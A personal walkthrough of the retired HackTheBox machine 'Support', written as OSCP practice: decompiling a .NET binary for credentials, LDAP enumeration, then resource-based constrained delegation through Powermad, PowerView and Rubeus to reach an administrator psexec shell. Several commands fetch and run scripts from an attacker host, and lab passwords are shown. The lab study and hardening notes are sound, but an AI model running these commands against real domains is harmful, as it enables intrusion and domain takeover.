# Support Helped-Through

Name: Support
Date:  22/01/2023
Difficulty:  Easy 
Goals: 
- OSCP Prep - Brutal 12 hour *examINATION* of ability
- Finish with Al, answer any questions I can when "does anyone is chat know X"
- Be more social
Learnt:
- Thinking fast and slow
- Past work must be a guide not a path
- Defaults on service exist that Tools do not enumerate or openly warn you they dont. 
- C Sharp Deserialization tools
- Improving my setup Windows VM for hacking
- Come correct or get corrected - never chatted on a twitch channel before.
- Stop - OODA on communication over any chat.
- Dont think bloodhound is just local ingestor!
- `:set paste` into my setup for tmux and vim and it works and maybe I would get a tatoo that said this. WOW!
- Checked the authenicated ldap queries output for interesting fields?
- Some PSRemote is not disable entirely!  
Beyond Root
- AD hardening this box

For a brutal self assessment after clearing my head I am returning to this box to simulate exam conditions for personally self assessment. Day One of Four, idea being the recon is mostly done, thus shave off 1-2 hours off that 14 hours. 2 - 2.5 hours per box. Spoiler I failed because I did not know you had to manually enumerate ldap as the tools use do not query the information field. I by chance tuned into [Alh4zr3d live on twitch for the first time](https://www.twitch.tv/alh4zr3d). 

## Recon

The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
![ping](HackTheBox/Retired-Machines/Support/Screenshots/ping.png)
Double check avaliability on common port, when a weird ping retest upon brutalExamifail attempt. 
![](smb-now-filtered-questionmark.png)

Consideration for later although this is probably the non-vip IP that is hardcoded in the deployment script for the box.
![](internaldns.png)

Enum4Linux turns up 
![](e4l-domainname.png)
Quick RPClient check: 
![](rpcclient-check.png)
CRackmapexecing ahoy!
![](archandbuild.png)
Check SMBCLIENT with guest user.
![](smbclienttotherescue.png)
Enumerating shares
![](readableguestshares.png)
Continuing with Crackmap exec to rid brute the usernames
![](ridbrute.png)

Noted researching a way to get crackmap output into a users.txt!! 

![](supporttoolsmbshare.png)

![](publickeeytoken-userconfig.png)

```
publicKeyToken="b03f5f7f11d50a3a"
```

There is function that gets a password
![](stringofuserinfoexedoespassstuff.png)

![](fileUserInfo-exe.png)
Fumbling around with Radare and Ghidra. False positive? Probably
![](cromwellpublickey.png)

![](erroronpassfalsepositive.png)
Decided to brute force with userlist in the background

Confirmed false postive.
![](deniedrpc.png)
:(
![](anypasswordwilldo.png)

Returning to this, I reviewed the information. Refreshed, I went back ghidra knowing that I certain there must be a password in here. Found in the debug data that there is 0xdf user on the box.
![](0xdfusers.png)
I remember think this was  weird it `$5a280d0b-9fd0-4701-8f96-82e2f1ea9dfb`. It is the 
![1000](guid.png)

Got Ilspy after melting my brain with "I" "L" "l" madness of naming C sharp decompilers. 
![](passwords.png)
User and Password! 
![](checkpass.png)
![](passpass.png)
But I cant list shares or RID Brute.
`armando : 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
![](doublehtehashcheck.png)

Reenumeration continues, personal takeways:
- Ldapsearch notes need tuning
- Forums are good and bad 
	- I did not check for encryption as my decompilation attempts did not show any encrypting functions - except I did with `enc_password`

[No dpapi though](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectdata?redirectedfrom=MSDN), custom encryption, because why would..

There is alot of ldap related activity in the UserInfo.exe decompile

![](hereitistheresourguycongratstony.png)
Playing around with decompilation tools
![](Ohdeargoditis.png)

Extracting and [learning some C sharp](https://learnxinyminutes.com/docs/csharp/)  and [compilation](https://learn.microsoft.com/en-us/visualstudio/get-started/csharp/run-program?view=vs-2022)

![](thatsabingo.png)
for (int i = 0; i<array)

`nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

![](support.png)

Is the ldap user account's password
![](gettingsomewhere.png)

Group considerations
![](supportisaremotemanager.png)

Spider_plus with ldap users, 
```bash
cat 10.129.227.255.json | grep Policies | awk -F\" '{print $2}'
```

Review what the account actually was doing because I did not know that the tools did not check the infomration field.
![](thisquery.png)

![](directorysearchclass.png)

```bash
ldapsearch -x -H ldap://10.129.227.255 -D "support\ldap" -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "dc=support,dc=htb"  "(giveName=support)(&(givenName=support)(sn=))(sn=)" "(objectClass=*)"
```

#### Returning in 2023 at this point

223 is hex of 0xdf; the credential I found `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`
![](noasrep.png)
And
![](nokerbroast.png)
Lost all these weird point on betting he would not entering the command correctly. 

At this point I stop with the Twitch following along. I made an arse of myself twice - being incorrect in the hope of helping, decided not pollute the evening or anyone elses and consider how to actually communicate over chat. My conclusions being that it is just of context - set and setting issue tied to wanting to be social in with other that like this stuff while I never have used chat on phones or discord, twitch, twitter, facebook. Email is just glorifed letters that make people waste their time deleting them. Decided I did not want this inital failure to be damaging [[Racetrack-Bank-Helped-Through]] will is imperative practice being chat without being in chat and research how to connect my provably excellent social skills in-person to online.  

Analysing the situation:
1. Parasocial relationships unseat real world behaviours/contexts - for the defense of the individual streaming content otherwise people would not do it.
2. It is easier to make errorious and mistaken inferences in written communication  and is similarly easily misinterpretable by reader than shared-location physical and spoken communication 
3. I was there to talk, to be a part of something and although I did not say anything rude, I got two pieces of information wrong, the second which may have come rude. 
4. I talked too much, to make friends is a slower paced process - people are there long term, there are alot of people   

I will not play smart and change usernames or account names, will not reach out to Al, forget or create and alternative version of events internally to bypass the shame. I will do what I have always done.

So [finished the machine with Ippsec](https://www.youtube.com/watch?v=iIveZ-raTTQ)

The query I was looking for:
```bash
ldapsearch -H ldap://10.129.232.193 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b 'dc=support,dc=htb'
```
or `-D 'ldap@support.htb'`

Checked the authenicated ldap queries output for interesting fields?

## Exploit

Running a remote Bloodhound with:
```bash
python3 /opt/BloodHound.py/bloodhound.py --dns-tcp -c all -d support.htb -ns 10.129.227.255 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```
Interestingly Ippsec choose to use --dns-tcp flag for only use tcp - this is cool because there it willl take longer make more noise but have less chance of erronious connections, collections, etc. 


![](SpecialIndicateDomainadminherewecome.png)

- SIDs above 1000 indicate non defaults - default are below 1000: DA 521; EA 519 - are there any?

Bloodhound does not look at the info field use description field. Then had a facepalm into ldap as I missed the "z" off the ldap password.

![](infotabsadface.png)

One criticism of this box is that they did not put info field. Tags on all the other users. In cloud network it is really encourage to automate tagging and this sort of tagging would be done on mass, unless I guess needle-in-a-haystack-one-misconfiguration...

Apparently it is common for shared accounts, but Azure makes it really easy to use just-in-time MFA so this issue is really a legacy on-premise issue.

` support : Ironside47pleasure40Watchful `

More positively it is do not trust the tool to be some perfect set of mechanisms to get data.

![](ownedironsider.png)

As stated , but Ippsec does a nice non-verbal "go back to Bloodhound with this info first" - ORIENTATE correctly. Due to being a bit happy with the next couple of steps. I am turn off the video and continue on regardless. Ippsec does the following step entirely remotely, whereas I want more Powershell strugglebus experience first.

![](itriedbutpowershellrytoharden.png)
I tried, but I forgot about `evil-winrm`
![](wowsharpeninghtedgesagain.png)


## Foothold & PrivEsc

GenericAll Abuse - Create a machine account with password and the permission to be *AllowedToActOnBehalfOfOtherIdentity* , then to forge a self-signed a ticket to impersonate a user in the explained  given below by Bloodhound:

Full control of a computer object can be used to perform a resource based constrained delegation attack. Abusing this primitive is currently only possible through the Rubeus project.  First, if an attacker does not control an account with an SPN set, [Kevin Robertson's Powermad project](https://github.com/Kevin-Robertson/Powermad) can be used to add a new attacker-controlled computer account:

Download:
```powershell
PS C:\programdata> curl http://10.10.10.10/Rubeus.exe -o Rubeus.exe
C:\programdata> IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerView.ps1')
PS C:\programdata> IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/Powermad.ps1')
# Check if you create machine
Get-DomainObject -Identity 'DC=SUPPORT,DC=HTB' | ms-ds-machineaccountquota
```


```powershell
New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)
```

PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:

```powershell
$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid
```

We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:

```powershell
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
```

Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:

```powershell
Get-DomainComputer attackersystem | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

[SharpCollection: Rubeus](https://github.com/Flangvik/SharpCollection.git) or [Ghostpack/Rubeus](https://github.com/GhostPack/Rubeus)
We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:

```bash
Rubeus.exe hash /password:Summer2018!
```

And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:

```bash
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt
```

![](attackdeploymachine.png)
` EF266C6B963C0BB683941032008AD47F `

```powershell
Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:administrator /msdsspn:cifs/DC.support.htb /ptt
```

![](wowowowow.png)

Remove all spaces vim motion and set mode to paste! - I finally got around the issue! wow!
```lua
:set paste
%s/ //g
:wq ticket.kirbi.b64
```
I used mouspad and echo for ages to work around tmux. I got better various Vim stuff. And for vim just `%` not `:` like vi.

Decode Ticket, Convert the Ticket and set KRB5CCNAME variable 
```bash
base64 -d ticket.kirbi.b64 > ticket.kirbi 
impacket-ticketConverter ticket.kirbi ticket.ccache
export KRB5CCNAME=ticket.kirbi
impacket-psexec -k -no-pass support.htb/administrator@dc.support.htb
```

## Beyond Root

Does Al have any beyond root ideas that arent just patching the AD vulnerability in this box that is good for OSCP preparation  

#### Patching the AD  

Two patches:
1. A shared account should not be able to psremote, just no.
2. A shared group that contains no sys admin users should not have generic write.

[Disable PSRemoting](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/disable-psremoting?view=powershell-7.3) into a DC, this will not affect remoting configurations
```powershell
Disable-PSRemoting -Force
```
Thereby requiring a shared account if on a hypothetical network, could then have a psremoting configuration from a ARM template setup for that account.

Remove GenericAll from the Shared Support Account
```powershell
Remove-ADPermission -Identity dc.support.htb -User '$userORexchangeuserORsecuritygroup' -AccessRights GenericAll
```

#### Strings Encoding options Research 

Different strings encoding may reveal different hardcoded credentials on poor designed applications
```bash
strings -e s # 7-bit byte (used for ASCII, ISO 8859) - Default
strings -e S # 8-bit byte
strings -e b # 16-bit bigendian
strings -e l # 16-bit littleendian
```

#### DotNET

Considering how much work I put into getting my Windows Reversing System up and awesome. Why not unsure that Kali has .NET. Here is an install .NET script on Kali creating a paranoid variable export to profiles and rc files, for the just in case.   
```bash
#!/bin/bash
# Run as non root user.
# https://learn.microsoft.com/en-us/dotnet/core/install/linux-debian
wget https://packages.microsoft.com/config/debian/11/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
wait
sudo dpkg -i packages-microsoft-prod.deb
wait
rm packages-microsoft-prod.deb
sudo apt-get update
wait
sudo apt-get install -y dotnet-sdk-6.0
wait
sudo apt-get install -y aspnetcore-runtime-6.0
wait
sudo apt-get install -y dotnet-runtime-6.0
wait
echo "" | sudo tee -a /etc/profile
echo "# ENV variable for DOTNET Telemetry disabled" | sudo tee -a /etc/profile
echo "export DOTNET_CLI_TELEMETRY_OPTOUT=1" | sudo tee -a /etc/profile
echo "" | sudo tee -a /etc/zsh/zprofile
echo "# ENV variable for DOTNET Telemetry disabled" | sudo tee -a /etc/zsh/zprofile
echo "export DOTNET_CLI_TELEMETRY_OPTOUT=1" | sudo tee -a /etc/zsh/zprofile
echo "" | sudo tee -a /root/.zshrc
echo "# ENV variable for DOTNET Telemetry disabled" | sudo tee -a /root/.zshrc
echo "export DOTNET_CLI_TELEMETRY_OPTOUT=1" | sudo tee -a /root/.zshrc
echo "" | sudo tee -a /root/.bashrc
echo "# ENV variable for DOTNET Telemetry disabled" | sudo tee -a /root/.bashrc
echo "export DOTNET_CLI_TELEMETRY_OPTOUT=1" | sudo tee -a /root/.bashrc
echo "" | tee -a ~/.zshrc
echo "# ENV variable for DOTNET Telemetry disabled" | tee -a ~/.zshrc
echo "export DOTNET_CLI_TELEMETRY_OPTOUT=1" | tee -a ~/.zshrc
exit
```

## Conclusions

All in all this was an awesome journey of a machine. I learnt an enormous amount from this machine and about myself. I pushed myself really hard while, pushing my set under a time constraint that was insanely unfair. 

I could have used Wireshark, running binaries found on my machines does not sit with me at all. Instead I learnt alot out C\#. The Wireshark approach is quicker though, I also skipped it. [0xdf](https://0xdf.gitlab.io/2022/12/17/htb-support.html#beyond-root) says that it would not have worked from Windows anyway with Wireshark, which in turn would mean that if it was developed in reality not for a CTF no developer would make that and think that if they would go out of their way to force it to perform simple authenication, something Windows is trying to stop developers doing. 

I have done this attacks before, but everything worked when it did not it I was able to fix it:
- Ldap - still abit annoy about that info field thing
- Remote Bloodhound.py madness survived like Al, whom I bet against as one stream was a 30 minutes nightmare of watching that unravel
- Get impacket-psexec working
- Fixing how to communicate in chat.


`:set paste` is the equivalent to leveling up.

